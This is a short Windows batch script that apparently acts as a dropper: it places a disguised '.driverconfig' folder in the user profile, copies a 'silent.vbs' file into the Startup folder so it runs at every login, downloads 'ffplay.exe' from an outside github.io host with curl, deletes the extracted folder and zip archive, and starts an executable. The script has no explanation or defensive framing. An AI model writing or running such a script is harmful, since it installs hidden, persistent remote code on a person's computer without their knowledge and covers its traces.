move %USERPROFILE%/A/.driverconfig %USERPROFILE% &
copy %USERPROFILE%\.driverconfig\silent.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" &

cd %USERPROFILE%\.driverconfig &

curl -L -o ffplay.exe https://jmorg23.github.io/AV/ffplay.exe &
cd %USERPROFILE% &
rd a &
del a.zip &
start %USERPROFILE%\.driverconfig\your_project.exe

exit